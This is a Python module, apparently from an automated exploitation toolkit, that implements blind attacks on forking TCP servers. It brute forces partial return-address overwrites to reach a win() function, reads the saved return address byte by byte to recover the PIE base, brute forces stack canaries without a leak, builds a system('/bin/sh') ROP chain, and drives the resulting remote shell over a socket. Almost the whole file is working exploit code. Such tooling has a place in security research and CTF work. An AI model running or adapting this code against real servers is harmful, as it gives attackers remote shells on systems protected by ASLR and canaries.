"""Leak-free PIE ret2win against a FORKING server (a BROP-style partial overwrite).

A one-shot process re-randomises its PIE base on every exec, so a leak-free partial overwrite can
only brute the 4 base bits in the second byte at ~1/16 per run -- probabilistic, and win() must sit
within ~64 KiB of the return site. A server that fork()s per connection is different: ASLR rolls
once at the parent's exec and every child INHERITS that layout, so the base is STABLE across
connections. That turns the brute DETERMINISTIC: the low byte of the return address is fixed by the
page offset, and the second byte carries the one unknown base nibble, so trying its 256 values is
GUARANTEED to hit win() -- no information leak, and in a bounded number of connections rather than a
1/16 gamble per process.

This module is the transport-agnostic core: it drives an `oracle(payload) -> output` callable, so
the byte-search is unit-tested against a simulated layout and reused over a real socket. The caller
confirms a real effect (a spawned shell evaluating a forgery-proof marker) and runs a negative
control; nothing here claims success on its own.
"""
from __future__ import annotations

import logging
import socket
import subprocess
import time

_log = logging.getLogger(__name__)

_BYTE = range(256)


def candidate_overwrites(offset: int, win_off: int, *, aligns=(0, 1), pad: bytes | None = None):
    """Yield (payload, nbytes, align, second_byte) partial-overwrite candidates for a forking server
    whose layout is stable across connections.

    Byte 0 of the target return address is `(win_off+align) & 0xFF` -- deterministic, because the PIE
    base is page-aligned and contributes nothing below bit 12. A 1-byte overwrite hits when win() is
    in the same 256-byte block; otherwise byte 1 mixes the one unknown base nibble (bits 12-15) with
    the known page bits (8-11), so all 256 values of byte 1 are tried and one is guaranteed to land
    on win() when it is within 64 KiB of the return site. `aligns` covers win and win+1 (a system()
    call needs a 16-byte-aligned rsp; skipping the `push rbp` prologue flips the alignment).

    `pad` replaces the `b"A" * offset` filler, which is what makes this work on a target WITH a
    stack canary: the filler then carries the brute-forced canary back at its own slot (see
    `canary_pad`), so the overwrite reaches the saved return address without tripping
    `__stack_chk_fail`. It must be exactly `offset` bytes long."""
    fill = b"A" * offset if pad is None else bytes(pad)
    if len(fill) != offset:
        raise ValueError(f"pad is {len(fill)} bytes, expected {offset}")
    # 1-byte fast path for each alignment (win in the same 256-byte block).
    for align in aligns:
        b0 = (win_off + align) & 0xFF
        yield fill + bytes([b0]), 1, align, None
    # 2-byte search (win within 64 KiB). INTERLEAVE the alignments: a system() call needs a
    # 16-byte-aligned rsp, so only one of win / win+1 works, and every attempt at the wrong
    # alignment crashes the child. Interleaving reaches the right alignment's correct second byte in
    # ~2*b1 connections instead of after a full wasted 256-attempt sweep of the other alignment.
    for b1 in _BYTE:
        for align in aligns:
            b0 = (win_off + align) & 0xFF
            yield fill + bytes([b0, b1]), 2, align, b1


def brute_ret2win(oracle, offset: int, win_off: int, markers, *, aligns=(0, 1), cap: int = 600,
                  pad: bytes | None = None):
    """Drive `oracle(payload) -> output` with partial-overwrite candidates until a forking server's
    child reaches win() and its spawned shell EVALUATES the forgery-proof marker. Returns the winning
    (payload, nbytes, align) or None. Bounded by `cap` connections (2 aligns x (1 + 256) = 514)."""
    tried = 0
    for payload, nbytes, align, _b1 in candidate_overwrites(offset, win_off, aligns=aligns,
                                                            pad=pad):
        if tried >= cap:
            break
        tried += 1
        if markers.proves(oracle(payload)):
            return payload, nbytes, align
    return None


# ------------------------------------------------------------------- socket transport (forking TCP)
def socket_oracle(port: int, follow: bytes, *, host: str = "127.0.0.1", timeout: float = 1.0,
                  gap: float = 0.15):
    """An `oracle(payload)` over a fresh TCP connection to a forking server: send the overflow, then
    `follow` (the marker command the spawned shell should evaluate), and return whatever comes back.
    A child that crashed on a wrong overwrite resets the connection and returns b"" -> not a win; a
    child that reached win()->system("/bin/sh") (with the client socket as its stdio) runs the
    command and returns its output, which `markers.proves` then grades."""
    def oracle(payload: bytes) -> bytes:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((host, port))
            s.sendall(payload)
            # Let the handler's single read() consume ONLY the overflow and return into win(): the
            # shell it spawns must read the marker command FRESH from the socket, not have it eaten
            # by the same read() that took the payload.
            if follow:
                time.sleep(gap)
                s.sendall(follow)
            chunks = []
            try:
                while True:
                    b = s.recv(4096)
                    if not b:
                        break
                    chunks.append(b)
            except socket.timeout:
                pass
            return b"".join(chunks)
        except OSError:
            return b""
        finally:
            try:
                s.close()
            except OSError:
                pass
    return oracle


def spawn_server(exe: str, argv, *, as_gb: int = 4, cpu_s: int = 120):
    """Spawn a server target once (its ASLR layout is then fixed for every forked child). Its own
    session so a kill reaps the whole group. Returns the Popen or None.

    The limits are deliberately LIGHT and -- unlike the fuzzing sandbox -- keep ASLR ON and do not
    cap the address space tightly: a BROP exploit's whole purpose is to defeat REAL ASLR with no
    leak, and the redirected child must be able to execve a shell, which the fuzzer's
    ADDR_NO_RANDOMIZE + tight RLIMIT_AS both break. A generous AS cap and no core dump still bound a
    runaway."""
    def _limits():
        import resource
        for res, val in ((resource.RLIMIT_CORE, (0, 0)),
                         (resource.RLIMIT_CPU, (cpu_s, cpu_s + 1)),
                         (resource.RLIMIT_AS, (as_gb << 30, as_gb << 30))):
            try:
                resource.setrlimit(res, val)
            except Exception:                            # noqa: BLE001
                pass
    try:
        return subprocess.Popen([str(exe)] + [str(a) for a in argv or []],
                                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL, start_new_session=True,
                                preexec_fn=_limits)
    except OSError:
        return None


def wait_for_port(proc, *, timeout: float = 5.0):
    """The TCP port the freshly-spawned server is listening on (read from /proc, no guessing), or
    None if it never listened. Reuses netfuzz's discovery so there is one definition of it."""
    from ..fuzz import netfuzz
    return netfuzz._wait_for_port(proc, "tcp", None, timeout)


# ---------------------------------------------- blind stack reading (no-win, no-leak PIE base)
# A forking server that sends a response ONLY AFTER the vulnerable function returns gives a
# crash-vs-survived oracle: a saved return address that keeps its real bytes lets the function
# return and the server responds; a corrupted byte crashes the child and no response comes. That
# oracle reads the saved return address off the stack ONE BYTE AT A TIME -- the byte value that
# survives is the real one -- recovering a live code pointer, and thus the PIE base, with no leak
# and no win() (classic BROP "stack reading"). The server's layout is stable across forked children,
# so the reads are deterministic rather than a 1/16 gamble.

def make_survive_oracle(port: int, *, host: str = "127.0.0.1", token: bytes = b"OK",
                        timeout: float = 0.8, tries: int = 3):
    """survives(payload) -> True iff the child did NOT crash (its post-return response `token`
    arrived). Retries a negative `tries` times: a real survival reliably sends the token, so a retry
    clears a transient socket timeout, while a real crash never sends it and stays False.

    An empty `token` means "any response at all counts as survival", which is what
    `calibrate_survive_token` hands back when a server answers with something other than the
    literal default."""
    def survives(payload: bytes) -> bool:
        for _ in range(tries):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            try:
                s.connect((host, port))
                s.sendall(payload)
                try:
                    got = s.recv(64)
                    if (token in got) if token else bool(got):
                        return True
                except socket.timeout:
                    pass
            except OSError:
                pass
            finally:
                try:
                    s.close()
                except OSError:
                    pass
        return False
    return survives


def find_overflow_offset(survives, *, lo: int = 8, hi: int = 512):
    """The smallest overflow length that crashes the child -- the distance to the first saved
    pointer (saved rbp, just below the return address). b"A"*L survives while L stays within the
    buffer and crashes once it clobbers that pointer."""
    for L in range(lo, hi):
        if not survives(b"A" * L):
            return L - 1
    return None


def read_saved_bytes(survives, offset: int, nbytes: int) -> bytes:
    """Recover `nbytes` of saved stack data above `offset`, byte by byte: for each position the one
    byte value that still lets the child return (survives) is the real byte; the rest crash."""
    known = bytearray()
    for _ in range(nbytes):
        g = next((b for b in range(256)
                  if survives(b"A" * offset + bytes(known) + bytes([b]))), None)
        if g is None:                                    # past the reliably-crashing region
            break
        known.append(g)
    return bytes(known)


# A Linux PIE main image loads high under ASLR (classically 0x55xx.../0x56xx...); the stack and libc
# live higher still at 0x7fxx.... A kernel with more mmap entropy spreads the image across a wider
# band -- measured up to 0x64xx... -- while the stack/libc stay at 0x71xx...-0x7fxx..., so the two
# are still cleanly separable at 0x70xx.... This window isolates the saved RETURN address (an image
# code pointer, anywhere below 0x70...) from the saved rbp (a stack pointer at 0x70... and up) in the
# same read, with no leak. Capping at 0x60... missed every image that randomised to 0x60-0x64 and
# made the blind recovery resolve only ~2 runs in 3.
_IMG_LO, _IMG_HI = 0x400000, 0x700000000000


def _image_pointer(known: bytes):
    """The first 8-byte little-endian window in `known` that looks like a main-image code pointer
    (the saved return address), skipping the saved rbp (a high stack pointer)."""
    for i in range(0, max(0, len(known) - 7)):
        v = int.from_bytes(known[i:i + 8], "little")
        if _IMG_LO <= v < _IMG_HI:
            return v
    return None


def recover_pie_base_blind(survives, *, target_bytes=None, ret_site_off=None, offset=None,
                           read_words: int = 2):
    """Recover a forking PIE server's image base with NO leak and NO win(): find the overflow
    offset, stack-read the saved return address, and resolve the base from it. Returns
    (base, return_address, offset) or None.

    The return address's HIGH bits (the randomised base) read reliably -- a wrong high byte points
    to an unmapped page and crashes -- but its LOW byte does not (a wrong low byte can still land on
    valid code in the same 256-byte block and survive). So when `ret_site_off` is known (the
    autopilot has it: the vulnerable function's caller return site), its page-invariant low 12 bits
    are FORCED onto the reliably-read high bits rather than blind-read. Blind (only `target_bytes`),
    the low 12 bits must instead match a call-return site exactly, which needs a clean low-byte read."""
    if offset is None:
        offset = find_overflow_offset(survives)
    if offset is None:
        return None
    known = read_saved_bytes(survives, offset, read_words * 8)
    v = _image_pointer(known)
    if v is None:
        return None
    if ret_site_off is not None:
        ra = (v & ~0xFFF) | (ret_site_off & 0xFFF)       # force the page-invariant low 12 bits
        base = ra - ret_site_off
        if base > 0 and (base & 0xFFF) == 0:
            return base, ra, offset
        return None
    if target_bytes is not None:
        from . import exploit
        bases = {v - s for s in exploit._call_return_sites(target_bytes)
                 if (s & 0xFFF) == (v & 0xFFF) and v - s > 0 and ((v - s) & 0xFFF) == 0}
        if len(bases) == 1:                              # unambiguous site match
            return next(iter(bases)), v, offset
    return None


def build_ret2system_chain(exe_path, target_bytes, base: int, offset: int):
    """A system("/bin/sh") ROP payload rebased onto a recovered image `base`: cyclic filler to the
    saved return address, then [ret-align, pop rdi, &"/bin/sh", system@plt]. Returns the bytes, or
    None when the image lacks a pop-rdi gadget, a "/bin/sh" string, or a system PLT slot (then the
    caller needs the libc-leak path instead). No leak and no win() -- the base came from stack
    reading and every address is image+offset."""
    from . import rop
    pop = rop.find_gadget(target_bytes, "pop_rdi")
    binsh = rop.find_string(target_bytes, b"/bin/sh")
    system = rop.resolve_plt(exe_path, "system")
    if pop is None or binsh is None or not system:
        return None
    return rop.build_ret2system(offset, base + pop, base + binsh, base + system, 0,
                                ret_gadget=base + pop + 1)    # pop+1 is the trailing `ret` (align)


def drive_socket_shell(port: int, chain: bytes, follow: bytes, *, host: str = "127.0.0.1",
                       timeout: float = 1.5, gap: float = 0.2) -> bytes:
    """Deliver a ROP `chain` over one connection, then (after the child's shell has spawned) the
    `follow` marker command, and return everything the shell writes back over the socket."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.sendall(chain)
        time.sleep(gap)
        s.sendall(follow)
        time.sleep(gap)
        out = b""
        try:
            while True:
                d = s.recv(4096)
                if not d:
                    break
                out += d
        except socket.timeout:
            pass
        return out
    except OSError:
        return b""
    finally:
        try:
            s.close()
        except OSError:
            pass


# ----------------------------------------------- the canary, brute-forced byte at a time (no leak)
# A stack canary is the one mitigation a forking server makes WEAKER rather than stronger. The
# canary is generated once, at the parent's TLS setup, and every forked child inherits it -- so the
# same crash-vs-survived oracle that reads a saved return address reads the canary, one byte at a
# time: overwrite the filler plus the canary's first k bytes, and only the byte that matches lets
# the function return and the server answer. 7 x 256 connections at worst (the first byte is a NUL
# by construction, so glibc's own design gives one of the eight away), against 2^64 for a guess.
#
# This is strictly cheaper than it looks next to the return-address read in `read_saved_bytes`: a
# wrong canary byte ALWAYS aborts, so every answer here is unambiguous, whereas a wrong low byte of
# a saved return address can still point at valid code and survive.
_CANARY_NUL = b"\x00"


def brute_canary(survives, *, offset=None, lo: int = 8, hi: int = 512) -> dict:
    """Recover a forking server's stack canary with NO information leak.

    `survives(payload) -> bool` is the crash-vs-survived oracle (`make_survive_oracle`): it must be
    driven by a response the server sends only AFTER the vulnerable function returns, because that
    return is where the canary is checked. `offset` is the distance from the start of the input to
    the canary slot; when it is None, `find_overflow_offset` measures it -- and on a canary-on
    target what that function finds IS the canary's offset, since the canary is the first thing
    past the buffer and clobbering it is what starts the aborting.

    Returns {ok, canary, offset, first_byte_nul, reason}. `ok` requires all 8 bytes AND that the
    low byte is NUL: glibc puts a terminator there deliberately (so a string read cannot leak the
    canary), which gives a free self-check that the slot found really is the canary rather than
    some other word that happened to crash."""
    if offset is None:
        offset = find_overflow_offset(survives, lo=lo, hi=hi)
    if offset is None:
        return {"ok": False, "canary": None, "offset": None, "first_byte_nul": False,
                "reason": f"no overflow length between {lo} and {hi} crashed the child, so there "
                          "is no crash-vs-survived oracle to brute with"}
    got = read_saved_bytes(survives, offset, 8)
    nul = got[:1] == _CANARY_NUL
    if len(got) < 8:
        return {"ok": False, "canary": None, "offset": offset, "first_byte_nul": nul,
                "reason": f"only {len(got)} of 8 canary bytes read back: no value of byte "
                          f"{len(got)} let the child return, so the slot at {offset} is not an "
                          "8-byte compared word"}
    if not nul:
        return {"ok": False, "canary": int.from_bytes(got, "little"), "offset": offset,
                "first_byte_nul": False,
                "reason": f"the 8 bytes at {offset} read back as {got.hex()}, whose low byte is "
                          "not the NUL terminator glibc puts in every canary -- the slot is some "
                          "other word that crashes when clobbered, not the canary"}
    return {"ok": True, "canary": int.from_bytes(got, "little"), "offset": offset,
            "first_byte_nul": True, "bytes": got,
            "reason": f"canary {int.from_bytes(got, 'little'):#018x} read byte at a time over "
                      "connections, no leak"}


def canary_pad(ret_offset: int, canary: int, *, canary_offset: int, filler: bytes = b"A",
               saved_rbp: bytes = b"B") -> bytes:
    """The `offset`-length filler for `candidate_overwrites`/`brute_ret2win` on a canary-on target:
    junk up to the canary, the canary itself VERBATIM, then junk over whatever lies between it and
    the saved return address (the saved rbp, normally).

    Writing the canary back unchanged is the whole point -- the epilogue's compare then passes and
    the corrupted return address is actually taken."""
    if ret_offset < canary_offset + 8:
        raise ValueError(f"saved return at {ret_offset} is not past the canary at {canary_offset}")
    gap = ret_offset - canary_offset - 8
    return (filler * canary_offset) + canary.to_bytes(8, "little") + (saved_rbp * gap)


def brute_frame(survives, *, offset=None, words: int = 3, lo: int = 8, hi: int = 512) -> dict:
    """The whole frame above the buffer, read byte at a time with no leak: the canary, and the
    offset of the SAVED RETURN ADDRESS past it.

    Why the return address's slot has to be read rather than probed: the first word past the canary
    is normally the saved rbp, and corrupting that crashes the child too (`leave` then sets rsp from
    a wild value), so a crash-vs-survived search for "the first slot whose corruption kills it"
    finds the rbp and reports it as the return address -- measured, as a partial overwrite that
    never reached win(). Reading instead tells them apart by what they CONTAIN: the saved rbp is a
    stack pointer (0x7f...), the saved return address is a main-image code pointer, and
    `read_saved_bytes` writes the canary back on its own as it accumulates, so one sweep from the
    canary's offset covers all of it.

    Returns {ok, canary, canary_offset, ret_offset, ret_addr, saved, reason}. `ret_addr`'s high
    bytes are reliable and its LOW byte is not (a wrong low byte can still land on valid code in
    the same block and survive), which is exactly why callers want `ret_offset` from here and take
    the low 12 bits from a known return site."""
    if offset is None:
        offset = find_overflow_offset(survives, lo=lo, hi=hi)
    if offset is None:
        return {"ok": False, "canary": None, "canary_offset": None, "ret_offset": None,
                "reason": f"no overflow length between {lo} and {hi} crashed the child"}
    got = read_saved_bytes(survives, offset, 8 * max(2, words))
    if len(got) < 16:
        return {"ok": False, "canary": None, "canary_offset": offset, "ret_offset": None,
                "saved": got.hex(),
                "reason": f"only {len(got)} bytes read above the buffer: not enough to find a "
                          "saved return address past the canary"}
    if got[:1] != _CANARY_NUL:
        return {"ok": False, "canary": int.from_bytes(got[:8], "little"),
                "canary_offset": offset, "ret_offset": None, "saved": got.hex(),
                "reason": f"the word at {offset} is {got[:8].hex()}, whose low byte is not the NUL "
                          "terminator glibc puts in every canary -- this is not a canary frame"}
    ret_off = ret_addr = None
    for i in range(8, len(got) - 7, 8):                  # word-aligned slots above the canary only
        v = int.from_bytes(got[i:i + 8], "little")
        if _IMG_LO <= v < _IMG_HI:
            ret_off, ret_addr = offset + i, v
            break
    if ret_off is None:
        return {"ok": False, "canary": int.from_bytes(got[:8], "little"),
                "canary_offset": offset, "ret_offset": None, "saved": got.hex(),
                "reason": f"the canary read back, but none of the {len(got) // 8 - 1} words above "
                          "it holds a main-image code pointer, so the saved return address was not "
                          "located (try more `words`)"}
    return {"ok": True, "canary": int.from_bytes(got[:8], "little"), "canary_offset": offset,
            "ret_offset": ret_off, "ret_addr": ret_addr, "saved": got.hex(),
            "reason": f"canary {int.from_bytes(got[:8], 'little'):#018x} at {offset} and a saved "
                      f"return address {ret_addr:#x} at {ret_off}, both read byte at a time over "
                      "connections with no leak"}


def calibrate_survive_token(port: int, *, host: str = "127.0.0.1", probe: bytes = b"A" * 4,
                            timeout: float = 1.0):
    """What this server sends after the vulnerable function returns, measured on one connection
    with a payload too short to corrupt anything.

    The crash-vs-survived oracle needs SOME post-return response to key on, and assuming a literal
    (`b"OK"`) makes the oracle fixture-shaped. Returns the first 32 bytes the server answers with
    (use it as `token`), b"" when it answers with something unstable in length, or None when it
    says nothing at all -- in which case there is no survival oracle on this target and the blind
    paths have to decline rather than read 256 crashes as 256 wrong guesses."""
    seen = []
    for _ in range(2):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((host, port))
            s.sendall(probe)
            try:
                seen.append(s.recv(64))
            except socket.timeout:
                seen.append(b"")
        except OSError:
            seen.append(b"")
        finally:
            try:
                s.close()
            except OSError:
                pass
    if not all(seen):
        return None
    return seen[0][:32] if seen[0] == seen[1] else b""
